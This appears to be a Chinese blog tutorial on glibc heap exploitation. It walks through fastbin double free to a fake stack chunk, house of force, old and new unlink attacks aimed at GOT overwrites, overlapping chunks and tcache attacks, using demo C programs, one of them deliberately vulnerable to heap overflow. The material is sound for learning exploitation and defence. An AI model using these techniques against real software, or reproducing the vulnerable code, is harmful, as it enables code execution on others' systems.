<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var = <span class="number">0x21</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *c = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(a, <span class="string">"AAAAAAAA"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(b, <span class="string">"BBBBBBBB"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(c, <span class="string">"CCCCCCCC"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(9) %p points to %s\n"</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(9) %p points to %s\n"</span>, b, b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(9) %p points to %s\n"</span>, c, c);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one %p.\n"</span>, a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Then freeing another one %p.\n"</span>, b);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one %p again.\n"</span>, a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 4 buffers.\n"</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    *d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4nd malloc(9) %p points to %p\n"</span>, d, &amp;d);</span><br><span class="line">    <span class="keyword">char</span> *e = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(e, <span class="string">"EEEEEEEE"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"5nd malloc(9) %p points to %s\n"</span>, e, e);</span><br><span class="line">    <span class="keyword">char</span> *f = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(f, <span class="string">"FFFFFFFF"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"6rd malloc(9) %p points to %s\n"</span>, f, f);</span><br><span class="line">    <span class="keyword">char</span> *g = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(g, <span class="string">"GGGGGGGG"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"7th malloc(9) %p points to %s\n"</span>, g, g);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这个程序展示了怎样通过修改指针，将其指向一个伪造的 free chunk，在伪造的地址处 malloc 出一个 chunk。Double free之前的程序基本没变，关键点在于我们的下一次malloc：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br></pre></td></tr></tbody></table></figure>

<p>填充了一个地址：栈地址-0x8</p>
<p>  这一步的意义就是在于在栈上构造了一个合法chunk，伪造的chunk要有合法的堆头信息，所以应从size域-0x8开始。</p>
<p>特别要注意的是，fake fastbin中的size需要与改写指针的fastbin块大小一致，且p位为1。</p>
<p>可以看一下栈中的位置</p>
<p><img src="https://s2.loli.net/2022/01/27/1KCrU8tOBzqPJVy.png" alt="1590283439038-3681fb04-725f-4a4e-ae8a-cd6f17aa0b82"></p>
<p>而在fastbin中，原本的a堆块fd指针已经改为栈中对应的地址，因此当下一次malloc a时，就会在我们伪造的假chunk分配内存。</p>
<p><img src="https://s2.loli.net/2022/01/27/OSb7euGK2EHxFor.png" alt="1590284609774-10ac80a9-eab4-4ed0-8cd5-86cd1adab978"></p>
<p>如果能实现在栈中的任意地址写，那么就可以用栈的方法获取shell。</p>
<p>同样，如果存在堆溢出漏洞，也可以进行free chunk fd指针的修改，但是为了总结相关原理和便于理解，我举的例子都很简单，仅适合入门者学习参考。</p>
<hr>
<h3 id="2-house-of-force"><a href="#2-house-of-force" class="headerlink" title="2. house of force"></a>2. house of force</h3><p><strong>利用条件：</strong></p>
<p>1.能够以溢出的方式控制到top chunk的size域</p>
<p>2.能够自由地控制堆分配尺寸的大小</p>
<p>3.可以构造size拿到top chunk本身之外的内存，如libc的内存空间</p>
<p>这种方法主要是指堆块溢出覆盖top chunk中的size域的情况，通过将其修改为一个非常大的数据，从而可以申请非常大的空间，使得新top chunk的头部落到想要修改的位置。在下次申请时，就能够得到目标内存，从而实现泄露和改写。</p>
<p><strong>利用步骤如下：</strong></p>
<p>(1)首先先泄露出堆地址。</p>
<p>(2)利用堆溢出，将top chunk的size域修改为很大的数</p>
<p>(3)申请大块内存(可以通过堆地址和目标地址的距离进行计算)，使得top chunk的头部落在目标地址范围内。</p>
<p>(4)再次申请内存，那么新申请的内存即为目标地址，通常情况下(未开启FullRelro)，一般是将目标地址设为got表地址。</p>
<p><img src="https://i.loli.net/2020/07/23/URVaO8tr3z6buBf.png"></p>
<p>当我们计算好当前堆块与目标地址之间的偏移后，申请该大小的堆块，让chunk头会恰好落在目标地址前(低地址)，这时再次申请，我们就可以改写目标地址内容。</p>
<hr>
<h3 id="3-unlink-旧版"><a href="#3-unlink-旧版" class="headerlink" title="3.unlink(旧版)"></a>3.unlink(旧版)</h3><p>unlink攻击技术是利用glibc malloc的内存回收机制，通过堆溢出等方法进行内存修改。</p>
<p>要想利用unlink，首先要了解free()的工作过程：</p>
<blockquote>
<p>(1)如果size&lt;max fast，放入fastbin，结束<br>(2)如果前一个chunk是free的，unlink前面的chunk，合并两个chunk，并放入unsorted bin<br>(3)如果后一个chunk是free的，则unlink后面的chunk，合并两个chunk，并放入unsorted bin<br>(4)如果后一个是top chunk，则将当前chunk并入top chunk<br>(5)前后chunk都不是free的，则直接放入unsorted bin</p>
</blockquote>
<p>相关代码如下:</p>
<p><img src="https://i.loli.net/2020/07/23/JgR9imeK6YMQ2rZ.png" alt="image-20200723164353967"></p>
<p>流程大体是这样的：</p>
<p>(1)将前一个chunk占用的内存合并到当前chunk;<br>(2)修改指向当前chunk的指针，改为指向前一个chunk。<br>(3)使用unlink宏，将前一个free chunk从双向循环链表中移除</p>
<p>向前合并和向后合并过程类似，这里不再赘述。了解了unlink的基本原理之后，可以结合例子理解</p>
<p>存在unlink攻击漏洞的程序如下</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[] )</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">char</span> * first, * second; </span><br><span class="line"></span><br><span class="line">first = <span class="built_in">malloc</span>( <span class="number">666</span> );</span><br><span class="line">second = <span class="built_in">malloc</span>( <span class="number">12</span> );</span><br><span class="line">  <span class="keyword">if</span>(argc!=<span class="number">1</span>)</span><br><span class="line">     <span class="built_in">strcpy</span>( first, argv[<span class="number">1</span>] );</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>( first );</span><br><span class="line"><span class="built_in">free</span>( second );</span><br><span class="line"><span class="keyword">return</span>( <span class="number">0</span> );</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>该程序存在一个堆溢出漏洞：如果用户输入的argv1的大小比first变量的666字节更大的话，那么输入的数据就有可能覆盖掉下一个chunk的chunk header——这可以导致任意代码执行。而攻击的核心思路就是利用glibc malloc的unlink机制。</p>
<p>现在我们再来分析如果一个攻击者精心构造输入数据并通过strcpy覆盖了second chunk的chunk header后会发生什么情况。 </p>
<p>假设被覆盖后的chunk header相关数据如下： </p>
<blockquote>
<p>(1) 填充prev_size位为一个偶数</p>
<p>(2) size = -4 (64位下为-8) </p>
<p>(3) fd = free 函数的got表地址address – 12； </p>
<p>(4) bk = shellcode的地址 </p>
</blockquote>
<p>那么当程序调用free(first)后会发生什么呢？</p>
<p>我们一步一步分析，前面已经介绍过了free的流程，由于first前面无free的chunk，所以不会发生向后合并，因此来判断下面是向前合并，代码如下：</p>
<p><img src="https://i.loli.net/2020/07/23/kh4bnoClPHOEZRT.png" alt="image-20200723164646772"></p>
<p>本例中，next chunk就是second chunk，从上面代码可知chunk判断下一堆块是否free的方法，即通过nextchunk + nextsize计算得到指向下下一个chunk的指针，然后判断下下个chunk的size的PREV_INUSE标记位是否为0。</p>
<p>在本例中，此时nextsize被我们设置为了-4，这样glibc malloc就会将next chunk的prev_size字段看做是next-next chunk的size字段，而我们已经将next chunk的prev_size字段设置为了一个偶数，因此此时通过inuse_bit_at_offset宏获取到的nextinuse为0，即next chunk为free！</p>
<p>既然next chunk为free，那么就需要进行向前合并，所以就会调用unlink(nextchunk, bck, fwd)函数。</p>
<p>真正的重点就是这个unlink函数的利用，认真分析一下unlink的代码</p>
<p><img src="https://i.loli.net/2020/07/23/EHrP51xWJX7fKR2.png"></p>
<p>打眼一看，很像数据结构中学过的删除链表中某一结点的操作，确实如此，unlink实现的功能正是在bins链表中删除掉已经被合并的块。</p>
<p>具体利用流程如下：</p>
<blockquote>
<p>(1) 首先FD = nextchunk-&gt;fd = free地址 – 12;<br>(2) 然后BK = nextchunk-&gt;bk = shellcode起始地址；<br>(3) 再将BK赋值给FD-&gt;bk，即（free地址 – 12）-&gt;bk = shellcode起始地址；<br>(4) 最后将FD赋值给BK-&gt;fd，即(shellcode起始地址)-&gt;fd = free地址 – 12。</p>
</blockquote>
<p>作图理解一下：</p>
<p><img src="https://i.loli.net/2020/07/23/BTQOKLG2XSyHqge.png" alt="image-20200723165236574"></p>
<p>结合图片应该很好理解，借助了unlink将free()的got表修改为shellcode地址，当再次free(second)时，就会转而运行我们写好的shellcode了。</p>
<p>这里的chunk头并不是真实的，只是我们在攻击中需要让glic malloc在进行unlink时将它们强制看作chunk结构体而伪造的，也就是我上面说的结构合法。</p>
<hr>
<h3 id="4-unlink-freenote"><a href="#4-unlink-freenote" class="headerlink" title="4.unlink (freenote)"></a>4.unlink (freenote)</h3><p>上面Unlink的方法有些过时，但是可以拿过来学习一下原理，有助于对堆有更好的理解，目前新式的unlink中加入了许多限制，其中最重要的一条是：</p>
<p><code>FD-&gt;bk !=p || BK-&gt;fd !=p; </code></p>
<p>也就是说由于有一个保护检查机制，它会检查这个 chunk 的前一个 chunk 的 bk 指针是不是指向这个 chunk（后一个也一样），直接导致很多利用方式难以满足这个条件，比较有效的是freenote的方式。</p>
<p>下面介绍freenote的主要利用思路。</p>
<p>Free chunk 的双链表结构如下所示：</p>
<p><code>FD = p-&gt;fd = *(&amp;p + 2)</code><br><code>BK = p-&gt;bk = *(&amp;p + 3)</code></p>
<p>但现在执行unlink(P,BK,FD)时，需要满足FD-&gt;bk = p &amp;&amp; BK-&gt;fd = p的条件，即：</p>
<p><code>FD-&gt;bk = *(*(&amp;p + 2) + 3 ) = *(p[2] + 3) == p </code><br> <code>BK-&gt;fd = *(*(&amp;p + 3) + 2 ) = *(p[3] + 2) == p </code><br>=&gt;<br><code>p[2] = &amp;p – 3, p[3] = &amp;p – 2 </code></p>
<p>这里比较绕，建议画图辅助理解。</p>
<p>这时如果存在一个全局变量G_P，其中存储的指针指向p的话，那么就可以通过设置p[2] = &amp;p – 3, p[3] = &amp;p – 2 进行伪造，来满足指针检查。</p>
<p><img src="https://i.loli.net/2020/07/23/vLMebO9hn6pTHP4.png"></p>
<p>根据图所示，当构造的fake chunk溢出修改了下一个chunk的 prev_size和p位，就可以将fake chunk 伪造成free chunk，这时free掉下一个chunk，两个块便可合并，触发unlink。</p>
<blockquote>
<p>FD = P-&gt;fd<br>BK = P-&gt;bk<br>FD-&gt;bk = BK<br>BK-&gt;fd = FD</p>
</blockquote>
<p><img src="https://s2.loli.net/2022/01/27/DhwBNx1VLH9i3FZ.png" alt="1593172846524-c2fc14af-bf0c-44db-8c3d-d2b26e5ea2c5"></p>
<p>最终执行:</p>
<blockquote>
<p>FD-&gt;bk = BK; =&gt;p = *(&amp;p+3) = p[3] = &amp;p-2<br>BK-&gt;fd = FD; =&gt;p = *(&amp;p+2) = p[2] = &amp;p-3</p>
</blockquote>
<p>使得：<br><code>p= &amp;p – 3</code></p>
<p>最后，p指针指向全局变量G_P前面3个4(8字节)字节处。如果G_P是个管理结构，那么就可以实现任意地址读写了。即可以通过修改p所指向的内容来修改p的指针了</p>
<p>需要满足如下条件：</p>
<ol>
<li><p>存在堆覆盖，可以改写到即将要释放的堆块，将其prev_size改成所构造的堆块大小，size中p位改为0.</p>
</li>
<li><p>存在已知地址的指针(通常为全局变量)指向伪造的堆块头部。</p>
</li>
<li><p>能够释放后续堆块来触发unlink。</p>
</li>
</ol>
<hr>
<h3 id="5-forgotten-chunk"><a href="#5-forgotten-chunk" class="headerlink" title="5.forgotten chunk"></a>5.forgotten chunk</h3><p>forgotten chunk主要是指chunk的申请释放中被遗忘的部分，虽然堆块的申请和释放逻辑相对来说比较完善，但是检查还是存在漏洞。</p>
<p>简单的情况是从前往后释放，构造出残留堆块。</p>
<p><img src="https://i.loli.net/2020/07/23/RlSDu1gY6TMqkoh.png" alt="image-20200723165755808"></p>
<p>如图所示，如果存在缓冲区溢出，然后通过正常申请释放构造出重叠堆块。</p>
<p>对于已经使用的A,B,C三个堆块，在大小方面没有要求，其中如果A存在堆溢出，且能够覆盖到堆块B的size域(或存在其他改写方式也能达到相同目的)，将堆块B的size域的部分改写成size(B)+size(C)的值(NMP位保持不变)，然后对堆块B进行释放，这样是可以通过检查的，并且能将B,C识别成一个堆块进行处理。其中原本C后续堆块的prev_size域会被当成数据部分处理，不起标识作用，使检查能顺利通过。</p>
<p>在此基础上，可以结合最基本的堆利用方法、unlink、fastbin来对堆块进行利用。<br>(1) 如果C块或者其上还有其他未知块部分存在变量指针，则采用最基本堆利用方法，直接构造指针数据即可。<br>(2) 如果存在fastbin中的堆块，且其中想改写的目的地址符合fastbin利用条件，则采用fastbin的方法。<br>(3) 直接申请新堆块，在其中构造unlink利用的条件，通过释放堆块来触发unlink。</p>
<p>具体利用什么方法视情况而定。</p>
<h3 id="7-tcache利用"><a href="#7-tcache利用" class="headerlink" title="7. tcache利用"></a>7. tcache利用</h3><p>2.27的libc不再多说，基本没有任何检查，可以直接构造double free。</p>
<p>在libc-2.29，tcache添加了新的检测机制，相关的源码如下</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.27</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">} tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">//glibc-2.29</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">} tcache_entry;</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.27</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">{</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">{</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//glibc-2.29</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">{</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;	<span class="comment">//new</span></span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">{</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;	<span class="comment">//new</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>tcache机制首先会在heap开头位置创建一个tcache_perthread_struct结构体来维护：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];<span class="comment">//0x40</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];<span class="comment">//0x40*8</span></span><br><span class="line">} tcache_perthread_struct;</span><br></pre></td></tr></tbody></table></figure>

<p>其前0x40字节为对应大小tcache的数量，后0x200个字节为指针数组，指向tcache_entry链表的头部指针</p>
<p><img src="https://i.loli.net/2020/12/23/WYiPs2Mx9DzC1fk.png" alt="image-20201223173939891"></p>
<p>当chunk被free到tcache中时，<code>key</code>会被置为<code>tcache_perthread_struct</code>的地址，也就是heap开头的位置。当chunk从tcache中取出来时，<code>key</code>会被设置成NULL。总而言之，就是通过<code>key</code>来表明这个chunk是否在tcache中。</p>
<p>而这个<code>key</code>也是libc2.29中提供的对tcache的额外的检查，即在将一个chunk放入tcache时，会检查该chunk的<code>key</code>是否等于tcache结构体的地址，如果是，则进一步检查tcache中是否已有地址相同的chunk，从而触发double free的检查机制。</p>
<p>若key为0或者修改chunk的大小，使chunk的size不在该tacache内，即可再次造成doublefree。</p>
<p>这里记录另一种高版本tcache的利用，叫作Tcache Stashing Unlink Attack。glibc-2.29 samllbin范围内的申请流程：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))  </span><br><span class="line">    {  </span><br><span class="line">      idx = smallbin_index (nb);  </span><br><span class="line">      bin = bin_at (av, idx);  </span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin) <span class="comment">//取该索引对应的small bin中最后一个chunk  </span></span><br><span class="line">        {  </span><br><span class="line">          bck = victim-&gt;bk;  <span class="comment">//获取倒数第二个chunk  </span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="comment">//检查双向链表完整性  </span></span><br><span class="line">        malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);  </span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);  </span><br><span class="line">          bin-&gt;bk = bck; <span class="comment">//将victim从small bin的链表中卸下  </span></span><br><span class="line">          bck-&gt;fd = bin;  </span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)  </span><br><span class="line">        set_non_main_arena (victim);  </span><br><span class="line">          check_malloced_chunk (av, victim, nb);  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE  </span></span><br><span class="line">      <span class="comment">/* While we're here, if we see other chunks of the same size, </span></span><br><span class="line"><span class="comment">         stash them in the tcache.  */</span>  </span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb); <span class="comment">//获取对应size的tcache索引  </span></span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) <span class="comment">//如果该索引在tcache bin范围  </span></span><br><span class="line">        {  </span><br><span class="line">          mchunkptr tc_victim;  </span><br><span class="line"></span><br><span class="line">          <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span>  </span><br><span class="line">          <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count  <span class="comment">//当tcache bin不为空并且没满，并且small bin不为空，则依次取最后一个chunk插入到tcache bin里  </span></span><br><span class="line">             &amp;&amp; (tc_victim = last (bin)) != bin)  </span><br><span class="line">        {  </span><br><span class="line">          <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)  </span><br><span class="line">            {  </span><br><span class="line">              bck = tc_victim-&gt;bk;  </span><br><span class="line">              set_inuse_bit_at_offset (tc_victim, nb);  </span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)  </span><br><span class="line">            set_non_main_arena (tc_victim);  </span><br><span class="line">              bin-&gt;bk = bck; <span class="comment">//将当前chunk从small bin里卸下  </span></span><br><span class="line">              bck-&gt;fd = bin;  </span><br><span class="line">              tcache_put (tc_victim, tc_idx);  <span class="comment">//放入tcache bin里  </span></span><br><span class="line">                }  </span><br><span class="line">        }  </span><br><span class="line">        }  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);  </span><br><span class="line">          alloc_perturb (p, bytes);  </span><br><span class="line">          <span class="keyword">return</span> p;  </span><br><span class="line">        }  </span><br><span class="line">    }  </span><br></pre></td></tr></tbody></table></figure>

<p>从small bin中取出最后一个chunk的时候，对双向链表做了完整性的检查，然而，后面将剩余chunk放入tcache bin的时候，却没有这个检查。因此只要修改smallbin中最后一个chunk的bk为target地址，那么通过完整性检查后，它就被放入tcache中，就可以将target申请出来进行利用。</p>
<p>值得注意的一点是，需要使用到calloc()，可以绕过tcache，直接申请smallbin。因此该方法的利用条件为可以控制smallbin的bk，存在一条tcache bin（未满）和两个相同大小的smallbin存在的时候，通过calloc函数申请此大小的堆块触发将后一个smallbin中的堆块插入tcachebin链中。</p>
<p>glibc2.32引入的新的防御机制-<strong>safe-linking</strong>(异或加密) <a target="_blank" rel="noopener" href="http://blog.nsfocus.net/glibc-234/">参考</a>，tcache链也从7个增到16个</p>
